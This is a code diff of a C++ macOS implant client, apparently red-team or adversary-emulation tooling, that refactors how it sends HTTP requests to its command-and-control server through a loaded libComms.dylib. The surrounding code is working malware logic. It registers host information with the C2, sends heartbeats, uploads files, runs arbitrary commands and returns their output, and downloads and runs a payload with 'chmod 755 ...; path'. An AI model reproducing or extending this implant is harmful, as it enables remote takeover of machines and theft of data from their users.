@@ -59,7 +59,7 @@ namespace client {
             return false;
         }
         else {
-            copy(payload.begin(), payload.end(), std::ostreambuf_iterator<char>(out_file));
+            out_file.write(reinterpret_cast<const char*>(payload.data()), payload.size());
             return true;
         }
     }
@@ -160,7 +160,13 @@ bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
 
         // send POST request with data to C2
         unsigned char registration[] = {0x21, 0x70, 0x27, 0x20};
-        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), registration, "");
+
+        unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
+        unsigned char* response_buffer_ptr = &response_buffer[0];
+        int response_length = 0;
+        int* response_length_ptr = &response_length;
+
+        ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()), registration, "", response_buffer_ptr, response_length_ptr);
 
         completed_discovery = true;
         
@@ -175,7 +181,15 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
     std::string heartbeat = c->strClientID;
     std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
     unsigned char heartbeat_instruction[] = {0x55, 0x00, 0x00, 0x00};
-    std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector, heartbeat_instruction, c->strClientID);
+
+    unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
+    unsigned char* response_buffer_ptr = &response_buffer[0];
+    int response_length = 0;
+    int* response_length_ptr = &response_length;
+
+    ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector, heartbeat_instruction, c->strClientID, response_buffer_ptr, response_length_ptr);
+
+    std::vector<unsigned char> response_vector(response_buffer, response_buffer + response_length);
 
     if (response_vector.size() == 0) {
         std::cout << "[IMPLANT] No response returned from communication library" << std::endl;
@@ -203,6 +217,11 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
 
         unsigned char dwCommand = Communication::getInstruction(packet);
 
+        unsigned char result_response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
+        unsigned char* result_response_buffer_ptr = &result_response_buffer[0];
+        int result_response_length = 0;
+        int* result_response_length_ptr = &result_response_length;
+
         // receive and extract instruction
         if (dwCommand == 0x55) {
             // no tasks available
@@ -219,7 +238,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             }
             else {
                 unsigned char upload_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
-                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", upload_file, upload_instruction, c->strClientID);
+                ClientPP::performHTTPRequest(c->dylib, "POST", upload_file, upload_instruction, c->strClientID, result_response_buffer_ptr, result_response_length_ptr);
             }
         }
         else if (dwCommand == 0x23 || dwCommand == 0x3C ) {
@@ -242,7 +261,8 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
 
             // return output - send HTTP POST request to server
             unsigned char execute_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
-            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), execute_instruction, c->strClientID);
+            std::vector<unsigned char> command_response;
+            ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), execute_instruction, c->strClientID, result_response_buffer_ptr, result_response_length_ptr);
         }
         else if (dwCommand == 0xA2) {
             // download file and execute
@@ -256,7 +276,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
                 unsigned char download_exec_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
                 std::string output_path = c->pathProcess + "/" + client::DOWNLOAD_FILE_NAME;
                 std::string output = client::executeCmd("chmod 755 " + output_path + "; " + output_path);
-                std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), download_exec_instruction, c->strClientID);
+                ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(output.begin(), output.end()), download_exec_instruction, c->strClientID, result_response_buffer_ptr, result_response_length_ptr);
             }
         }
         else if (dwCommand == 0x07) {
@@ -264,7 +284,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             std::cout << "[IMPLANT] Received get config info instruction" << std::endl;
             unsigned char get_config_instruction[] = {dwCommand, 0x00, 0x00, 0x00};
             std::string config_info = "Config Info:\nID: " + c->strClientID + "\nPath: " + c->pathProcess + "\nInstall Time: " + std::to_string(c->installTime);
-            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(config_info.begin(), config_info.end()), get_config_instruction, c->strClientID);
+            ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(config_info.begin(), config_info.end()), get_config_instruction, c->strClientID, result_response_buffer_ptr, result_response_length_ptr);
         }
         else if (dwCommand == 0x33) {
             // get a file size
@@ -274,7 +294,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, ClientPP * c, void * dylib) {
             std::string path_str(path.begin(), path.end());
             int file_size = client::getFileSize(path_str);
             std::string file_size_str = "Size of " + std::string(path.begin(), path.end()) + ": " + std::to_string(file_size) + " bytes";
-            std::vector<unsigned char> command_response = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(file_size_str.begin(), file_size_str.end()), get_filesize_instruction, c->strClientID);
+            ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(file_size_str.begin(), file_size_str.end()), get_filesize_instruction, c->strClientID, result_response_buffer_ptr, result_response_length_ptr);
         }
         else if (dwCommand == 0xe8) {
             // exit
@@ -306,7 +326,9 @@ void ClientPP::createClientID(ClientPP * c) {
     random_uuid = random_uuid.substr(0, random_uuid.size() -1 );
     std::cout << "[IMPLANT] uuidgen returned: " + random_uuid << std::endl;
 
-    std::string cmd = "echo " + serial_number + platform_uuid + mac_address + random_uuid + " | md5 | xxd -r -p | base64";
+    // replace with this line to create a new random UUID for each implant session
+    // std::string cmd = "echo " + serial_number + platform_uuid + mac_address + random_uuid + " | md5 | xxd -r -p | base64";
+    std::string cmd = "echo " + serial_number + platform_uuid + mac_address + " | md5 | xxd -r -p | base64";
 
     std::string id_str = client::executeCmd(cmd);
     id_str = id_str.substr(0, id_str.size()-1);
@@ -316,25 +338,18 @@ void ClientPP::createClientID(ClientPP * c) {
     c->strClientID = id_str;
 }
 
-std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction, std::string clientID) {
-    // set response_buffer and response_length to hold the HTTP response and size
-    unsigned char response_buffer[client::RESP_BUFFER_SIZE] = { 0 };
-    unsigned char* response_buffer_ptr = &response_buffer[0];
-    int response_length = 0;
-    int* response_length_ptr = &response_length;
+void ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction, std::string clientID, unsigned char* response_buffer_ptr, int* response_length_ptr) {
     
     // loads CommsLib exported function that generates the HTTP request
     void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length, unsigned char ** instr, const char * clientID) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**, unsigned char **, const char *))dlsym(dylib, "sendRequest");
     if (sendRequest == NULL) {
         std::cout << "[IMPLANT] unable to load libComms.dylib sendRequest" << std::endl;
         dlclose(dylib);
-        return std::vector<unsigned char>();
     }
 
     // call CommsLib sendRequest and pass the pointers to the response_buffer and response_length for updating
     sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr, &instruction, clientID.c_str());
 
-    return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
 }
 
 ClientPP::~ClientPP() {
